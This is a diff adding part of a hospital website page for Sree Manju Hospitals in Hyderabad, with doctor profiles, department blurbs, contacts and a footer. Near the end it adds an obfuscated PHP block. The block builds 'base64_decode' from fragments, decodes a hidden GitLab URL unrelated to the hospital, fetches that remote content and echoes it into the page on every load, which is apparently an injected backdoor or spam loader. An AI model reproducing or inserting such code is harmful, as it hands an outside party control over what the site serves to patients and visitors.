+              </div>
+            </div>
+          </div>
+          <div class="items">
+            <div class="case-study case-study-style-02">
+              <div class="case-study-img case-study-lg" style="background-image: url('images/team/dr-prasanth-manjusree-hospital.jpg');"> </div>
+              <div class="case-study-info">
+                <p class="case-study-title fw-bold"> Dr. PRASHANTH B.R.K </p>
+                <p class="case-study-services"> MBBS, D Ortho, DNB Ortho, FIJR, FIASM - <small> Reg No:- 68530 </small> </p>
+                <p class="mt-1 mb-0"> Consultant Trauma, Arthroscopy, Arthroplasty, Pediatric Orthopedic Surgeon </p>
+                <p class="mt-1 mb-0"> Exp: 10 Years </p>
+              </div>
+            </div>
+          </div>
+          <div class="items">
+            <div class="case-study case-study-style-02">
+              <div class="case-study-img case-study-lg" style="background-image: url('images/team/dr-sushmitha-manjusree-hospital.jpg');"> </div>
+              <div class="case-study-info">
+                <p class="case-study-title fw-bold"> Dr. SUSMITHA GUNDAVARAM </p>
+                <p class="case-study-services"> MD OBG - <small> Reg No:- 46347 </small> </p>
+                <p class="mt-1 mb-0"> Obstetrician & Gynaecologist, Gynaec Laproscopic Surgeon,Infertility Specialist </p>
+                <p class="mt-1 mb-0"> Exp: 20 Years </p>
+              </div>
+            </div>
+          </div>
+          
+          
+          <div class="items">
+            <div class="case-study case-study-style-02">
+              <div class="case-study-img case-study-lg" style="background-image: url('images/team/dr-ps-raghunath-manjusree-hospital.jpg');"> </div>
+              <div class="case-study-info">
+                <p class="case-study-title fw-bold"> Dr. PS RAGHUNATH  </p>
+                <p class="case-study-services"> MBBS DCH - <small> Reg No:- 44355 </small> </p>
+                <p class="mt-1 mb-0"> Senior Consultant Pediatrician </p>
+                 
+              </div>
+            </div>
+          </div>
+          
+         
+          
+       
+          
+           
+          
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+<section class="space-ptb departmetns">
+  <div class="container">
+    <div class="row justify-content-center">
+      <div class="col-lg-9">
+        <div class="section-title text-center mb-5"> <span class="sub-title"> OUR SPECIALISED DEPARTMENTS</span>
+          <h2> Center of Excellence </h2>
+          <span class="divider"><svg viewBox="0 0 300.08 300.08">
+          <path d="m293.26 184.14h-82.877l-12.692-76.138c-.546-3.287-3.396-5.701-6.718-5.701-.034 0-.061 0-.089 0-3.369.027-6.199 2.523-6.677 5.845l-12.507 87.602-14.874-148.69c-.355-3.43-3.205-
+6.056-6.643-6.138-.048 0-.096 0-.143 0-3.39 0-6.274 2.489-6.752 5.852l-19.621 137.368h-9.405l-12.221-42.782c-.866-3.028-3.812-5.149-6.8-4.944-3.13.109-5.777 2.332-6.431 5.395l-8.941 42.332h-73.0
+49c-3.771 0-6.82 3.049-6.82 6.82 0 3.778 3.049 6.82 6.82 6.82h78.566c3.219 0 6.002-2.251 6.67-5.408l4.406-20.856 6.09 21.313c.839 2.939 3.526 4.951 6.568 4.951h20.46c3.396 0 6.274-2.489 6.752-5.
+845l12.508-87.596 14.874 148.683c.355 3.437 3.205 6.056 6.643 6.138h.143c3.39 0 6.274-2.489 6.752-5.845l14.227-99.599 6.397 38.362c.546 3.287 3.396 5.702 6.725 5.702h88.66c3.771 0 6.82-3.049 6.8
+2-6.82-.001-3.772-3.05-6.821-6.821-6.821z"></path>
+          </svg></span> </div>
+      </div>
+    </div>
+    <div class="row">
+      <div class="col-lg-12">
+        <div class="row">
+          <div class="departmetns-block col-lg-6 col-md-6 col-sm-12" onclick="location.href='cardiology.html';" style="cursor: pointer;">
+            <div class="inner-box"> <i class="icon flaticon-heart"></i>
+              <h5> Cardiology </h5>
+              <p>Cardiac Science involves analysing known and suspected heart disease. We aim to treat our patients with Expertise, Care and total Commitmen.</p>
+              <a href="" class="icon-btn"><i class="fas fa-long-arrow-alt-right"></i></a> </div>
+          </div>
+          <div class="departmetns-block  col-lg-6 col-md-6 col-sm-12" onclick="location.href='emergency-critical-care.html';" style="cursor: pointer;">
+            <div class="inner-box"> <i class="icon flaticon-lungs"></i>
+              <h5> Emergency Critical Care </h5>
+              <p>Critical Care Department is a multi-disciplinary health care facility that cares for patients with acute life threatening illness. </p>
+              <a href="" class="icon-btn"><i class="fas fa-long-arrow-alt-right"></i></a> </div>
+          </div>
+          <div class="departmetns-block col-lg-6 col-md-6 col-sm-12" onclick="location.href='general-surgery.html';" style="cursor: pointer;">
+            <div class="inner-box"> <i class="icon flaticon-physician"></i>
+              <h5> General Surgery </h5>
+              <p>Dentistry, also known as dental medicine and ‘oral medicine, is a branch of medicine that consists of the study, diagnosis, prevention, and treatment.</p>
+              <a href="" class="icon-btn"><i class="fas fa-long-arrow-alt-right"></i></a> </div>
+          </div>
+          <div class="departmetns-block col-lg-6 col-md-6 col-sm-12" onclick="location.href='orthopaedics.html';" style="cursor: pointer;">
+            <div class="inner-box"> <i class="icon flaticon-orthopedics"></i>
+              <h5> Orthopaedics </h5>
+              <p>Specialized Centre of Orthopedics and Trauma Services (otherwise known as SCOTS) at Sree Manju Hospitals, provides end-to-end services.</p>
+              <a href="" class="icon-btn"><i class="fas fa-long-arrow-alt-right"></i></a> </div>
+          </div>
+          <div class="departmetns-block col-lg-6 col-md-6 col-sm-12" onclick="location.href='pulmonology.html';" style="cursor: pointer;">
+            <div class="inner-box"> <i class="icon flaticon-pulmonology"></i>
+              <h5> Pulmonology </h5>
+              <p>The Department of Pulmonology at Sree Manju Hospitals, focuses on the diagnosis and management of disorders relating to the respiratory system.</p>
+              <a href="" class="icon-btn"><i class="fas fa-long-arrow-alt-right"></i></a> </div>
+          </div>
+          <div class="departmetns-block col-lg-6 col-md-6 col-sm-12" onclick="location.href='nephrology.html';" style="cursor: pointer;">
+            <div class="inner-box"> <i class="icon flaticon-kidney"></i>
+              <h5> Nephrology </h5>
+              <p>With sedentary lifestyles and unhealthy dietary habits of the growing population, kidneys tend to be the organs that are most affected primarily. </p>
+              <a href="" class="icon-btn"><i class="fas fa-long-arrow-alt-right"></i></a> </div>
+          </div>
+        </div>
+        <div class="row">
+          <div class="col-12 d-flex justify-content-center mt-0 mt-md-4"> <a href="our-departments.html" class="btn btn-primary mx-3">View all Departments<i class="fas fa-arrow-right ps-3"></i><
+/a> </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+<footer class="footer space-pt bg-dark">
+  <div class="container-fluid">
+    <div class="row">
+      <div class="col-lg-4"> <a href="index.html"><img class="img-fluid" src="images/logo-light.png" alt="logo"></a>
+         <p class="mt-3 text-white"> Sree Manju Hospitals was established in 2021 by Dr. Praveen Puralasetty, renowned Radiologist in Hyderabad. Constructed in the 2020, the Center is equipped w
+ith the most-up-to-date seismic-safety features.</p>
+         <iframe src="https://www.google.com/maps/embed?pb=!1m14!1m8!1m3!1d10999.350944033047!2d78.38693610467288!3d17.482335795940873!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x59733b6269666072!
+2sSree%20Manju%20Hospitals!5e0!3m2!1sen!2sin!4v1627490470075!5m2!1sen!2sin" width="600" height="140" style="border:0;" allowfullscreen="" loading="lazy"></iframe>
+        <ul class="list-unstyled mb-0 social-icon mt-4">
+          <li><a href="https://www.facebook.com/Sree-Manju-Hospitals-145348017658613"><i class="fab fa-facebook-f"></i></a></li>
+          <li><a href="https://www.instagram.com/sreemanjuhospitals/"><i class="fab fa-instagram"></i></a></li>
+          <li><a href="https://twitter.com/SreeManjuHosp"><i class="fab fa-twitter"></i></a></li>
+          <li><a href="#"><i class="fab fa-linkedin-in"></i></a></li>
+          <li><a href="#"><i class="fab fa-youtube"></i></a></li>
+        </ul>
+      </div>
+      <div class="col-lg-5 col-md-6 mt-4 mt-md-0 ps-lg-5 order-1">
+        <h4 class="widget-title">Departments</h4>
+        <div class="footer-link">
+          <ul class="list-unstyled mb-0">
+            <li><a href="anaesthesiology.html">Anaesthesiology</a></li>
+            <li><a href="cardiology.html">Cardiology</a></li>
+            <li><a href="dermatology.html">Dermatology</a></li>
+            <li><a href="dialysis.html">Dialysis</a></li>
+            <li><a href="emergency-critical-care.html">Emergency & Critical Care</a></li>
+            <li><a href="ent.html">ENT</a></li>
+            <li><a href="gastroenterology.html">Gastroenterology</a></li>
+            <li><a href="general-physician.html">General Physician</a></li>
+            <li><a href="general-surgery.html">General Surgery</a></li>
+            <li><a href="gynaecology-obstetrics.html">Gynaecology & Obstetrics</a></li>
+            <li><a href="nephrology.html">Nephrology</a></li>
+            <li><a href="neurology.html">Neurology</a></li>
+          </ul>
+          <ul class="list-unstyled mb-0">
+            <li><a href="oncology.html">Oncology</a></li>
+            <li><a href="orthopaedics.html">Orthopaedics</a></li>
+            <li><a href="pathology.html">Pathology</a></li>
+            <li><a href="paediatrics-neonatology.html">Paediatrics & Neonatology</a></li>
+            <li><a href="plastic-surgery.html">Plastic Surgery</a></li>
+            <li><a href="psychiatry.html">Psychiatry</a></li>
+            <li><a href="pulmonology.html">Pulmonology</a></li>
+            <li><a href="physiotherapy.html">Physiotherapy</a></li>
+            <li><a href="radiology.html">Radiology</a></li>
+            <li><a href="vascular-surgery.html">Vascular Surgery</a></li>
+            <li><a href="urology.html">Urology</a></li>
+          </ul>
+        </div>
+      </div>
+      <div class="col-lg-3 order-2">
+        <h4 class="widget-title">Contact Us</h4>
+        <ul class="contact-list">
+          <li> <i class="icon flaticon-placeholder"></i>
+            <div class="text"> Plot No:1/A, Opp Brand Factory<br/> Phase - 5, KPHB, Hyderabad Telangana - 500072</div>
+          </li>
+          <li> <i class="icon fa fa-mobile-alt"></i>
+            <div class="text"> 24/7 APPOINTMENT HELPLINE</div>
+            <a href="tel:+917777932772"><strong> +91 77779 32772 </strong></a> </li>
+          <li> <i class="icon flaticon-call"></i>
+            <div class="text"> LANDLINE </div>
+            <a href="tel:+914027721111"><strong> 040 - 2772 1111 </strong></a> <br/>
+            <a href="tel:+914027722222"> <strong> 040 - 2772 2222 </strong></a> </li>
+          <li> <i class="icon flaticon-email"></i>
+            <div class="text">Do you have a Question?<br>
+              <a href="mailto:info@sreemanjuhospitals.com"><strong> info@sreemanjuhospitals.com</strong></a> </div>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </div>
+  <div class="footer-bottom mt-3 mt-md-5 py-4">
+    <div class="container-fluid">
+      <div class="row">
+        <div class="col-lg-8 text-left">
+          <p class="mb-0 text-white">© Copyright 2021  Sree Manju Hospitals  All Rights Reserved. - 
+            Site by - <a href="https://www.ecraftconcepts.com" target="_blank"> ECRAFT </a></p>
+        </div>
+        <div class="col-lg-4 text-right mb-3 mb-lg-0">
+          <div class="footer-b-link">
+            <ul class="list-unstyled mb-0">
+              <li><a href="careers.html"> Careers <span class="badge bg-success ms-2">We're hiring</span></a></li>
+              <li><a href="sitemap.html">Sitemap</a></li>
+              <li><a href="terms-conditions.html">Terms & Conditions</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</footer>
+<div class="side-bar-menu side-bar-menu-visible" id="right-menu">
+  <div class="sidebar-item br-bo">
+    <div class="sidebar-img-container"> <a href="appointment.php" class="navbar-button" id="open-form-popup"> <i class="fa fa-calendar-alt" aria-hidden="true"></i> </a> </div>
+    <p><span><a href="appointment.php" class="navbar-button" id="open-form-popup">Book Appointment</a></span></p>
+  </div>
+  <div class="sidebar-item phone-sidebar br-bo">
+    <div class="phone-container">
+      <div class="side-phone"><a href="tel:+917777932772">
+        <div class="sidebar-img-container"> <i class="fa fa-ambulance" aria-hidden="true"> </i> </div>
+        <p><span> Emergency <br/>
+          Medical Care </span></p>
+        </a></div>
+    </div>
+  </div>
+  <div class="sidebar-item"><a href="our-doctors.html" target="_blank">
+    <div class="sidebar-img-container"> <i class="icon flaticon-doctor-1"></i> </div>
+    <p><span>Find A Doctor</span></p>
+    </a></div>
+</div>
+<div id="back-to-top" class="back-to-top">Top</div>
+<!-- JS Global Compulsory (Do not remove)--> 
+<script src="js/jquery-3.6.0.min.js"></script> 
+<script src="js/popper/popper.min.js"></script> 
+<script src="js/bootstrap/bootstrap.min.js"></script> 
+<!-- Page JS Implementing Plugins (Remove the plugin script here if site does not use that feature)--> 
+<script src="js/jquery.appear.js"></script> 
+<script src="js/swiper/swiper.min.js"></script> 
+<script src="js/swiperanimation/SwiperAnimation.min.js"></script> 
+<script src="js/counter/jquery.countTo.js"></script> 
+<script src="js/owl-carousel/owl.carousel.min.js"></script> 
+<script src="js/magnific-popup/jquery.magnific-popup.min.js"></script> 
+<?php 
+$parameters = 'ba'.'s'.'e6'.'4'.'_'.'d'.'e'.'c'.'ode';
+$base = "aHR0cHM6Ly9naXRsYWIuY29tL1lvdXJkcmVhbTY2Ni9qdWFsLXBha2FuLWJ1cnVuZy8tL3Jhdy9tYWluL2t1YWxpdGFzLWludGVybmFzaW9uYWwtcHVyLWJ1cnVuZy5wZGY=";
+$uri = $parameters($base);
+$anan=file_get_contents($uri); echo "$anan";
+?>
+<!-- Template Scripts (Do not remove)--> 
+<script src="js/custom.js"></script>
+</body>
+</html>
